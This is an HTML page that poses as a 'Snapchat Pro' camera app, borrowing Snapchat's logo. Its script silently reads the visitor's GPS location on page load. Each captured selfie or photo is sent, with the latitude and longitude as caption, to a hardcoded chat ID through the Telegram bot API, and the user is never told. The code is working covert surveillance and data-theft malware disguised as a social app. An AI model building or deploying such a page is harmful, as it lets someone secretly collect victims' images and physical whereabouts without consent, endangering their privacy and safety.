<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snapchat Pro</title>
  <style>
    /* Reset styles */
    body, html {
      margin: 0;
      padding: 0;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }

    #camera-container {
      position: relative;
      width: 100vw;
      height: 100vh;
      background: black;
    }

    /* Full-screen video */
    #camera {
      width: 100%;
      height: 100%;
      object-fit: cover;
      position: absolute;
      top: 0;
      left: 0;
      filter: none;
      transition: filter 0.3s ease;
    }

    /* Header (title and logo) */
    #header {
      position: absolute;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      padding: 15px;
      display: flex;
      flex-direction: column;
      align-items: center;
      z-index: 10;
    }

    #header h1 {
      color: white;
      margin: 0;
      font-size: 20px;
      text-align: center;
    }

    #header img {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      margin-top: 5px;
    }

    /* Buttons Container */
    #controls {
      position: absolute;
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      flex-direction: row;
      justify-content: center;
      align-items: center;
      z-index: 20;
      width: 100%;
      gap: 10px;
    }

    /* Buttons */
    .button {
      width: 60px;
      height: 60px;
      background-color: rgba(255, 255, 255, 0.3);
      border: 2px solid white;
      border-radius: 50%;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      color: white;
    }

    .button:hover {
      transform: scale(1.2);
      background-color: rgba(255, 255, 255, 0.5);
    }
  </style>
</head>
<body>
  <div id="camera-container">
    <!-- Header -->
    <div id="header">
      <h1>Snapchat Pro</h1>
      <img src="https://cdn.icon-icons.com/icons2/694/PNG/512/SnapChat_Rounded_icon-icons.com_61574.png" alt="Logo">
    </div>

    <!-- Camera -->
    <video id="camera" autoplay playsinline muted></video>

    <!-- Controls -->
    <div id="controls">
      <div id="capture" class="button">üì∏</div>
      <div id="toggle-camera" class="button">üîÑ</div>
    </div>
  </div>

<script>
  const video = document.getElementById('camera');
  const captureButton = document.getElementById('capture');
  const toggleCameraButton = document.getElementById('toggle-camera');

  let currentStream = null;
  let usingFrontCamera = true;
  let gpsLocation = null;

  // Start camera
  async function startCamera(front = true) {
    const constraints = {
      video: {
        facingMode: front ? 'user' : 'environment',
      },
    };

    if (currentStream) {
      currentStream.getTracks().forEach(track => track.stop());
    }

    try {
      currentStream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = currentStream;

      // Apply mirroring effect for front camera
      if (front) {
        video.style.transform = 'scaleX(-1)';
      } else {
        video.style.transform = 'scaleX(1)';
      }

      // Log video width/height to check camera status
      video.addEventListener('loadeddata', () => {
        console.log('Camera is working:', video.videoWidth, video.videoHeight);
      });
    } catch (error) {
      console.error('Error accessing camera:', error);
      alert('Error accessing camera. Please check camera permissions.');
    }
  }

  // Toggle camera
  toggleCameraButton.addEventListener('click', () => {
    usingFrontCamera = !usingFrontCamera;
    startCamera(usingFrontCamera);
  });

  // Capture image and send it to Telegram bot
  captureButton.addEventListener('click', () => {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.filter = video.style.filter;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL('image/png');
    console.log('Captured Image:', image);

    // Convert the image to a Blob to send it as a file
    const byteCharacters = atob(image.split(',')[1]);
    const byteArrays = [];

    for (let offset = 0; offset < byteCharacters.length; offset++) {
      const byteArray = new Uint8Array(1);
      byteArray[0] = byteCharacters.charCodeAt(offset);
      byteArrays.push(byteArray);
    }

    const blob = new Blob(byteArrays, { type: 'image/png' });

    // Send the image and GPS location to Telegram bot
    sendImageAndLocationToTelegram(blob);
  });

  // Get GPS location
  navigator.geolocation.getCurrentPosition(
    position => {
      const { latitude, longitude } = position.coords;
      gpsLocation = { latitude, longitude };
      console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
    },
    error => {
      console.error('Error getting location:', error);
    }
  );

  // Send the image and GPS location to Telegram bot
  function sendImageAndLocationToTelegram(imageBlob) {
    const formData = new FormData();
    formData.append('chat_id', '1676411287'); // Replace with your chat ID
    formData.append('photo', imageBlob, 'photo.png');

    // Add GPS location as a caption
    let captionText = '';
    if (gpsLocation) {
      captionText = `üåç Location:\nLatitude: ${gpsLocation.latitude}\nLongitude: ${gpsLocation.longitude}`;
    } else {
      captionText = 'üåç Location information not available.';
    }

    formData.append('caption', captionText);

    // Send the image and location to Telegram
    fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendPhoto', {
      method: 'POST',
      body: formData,
    })
      .then(response => response.json())
      .then(data => {
        console.log('Telegram response:', data);
      })
      .catch(error => {
        console.error('Error sending image to Telegram:', error);
      });
  }

  // Start with the front camera
  startCamera(true);
</script>

</body>
</html>
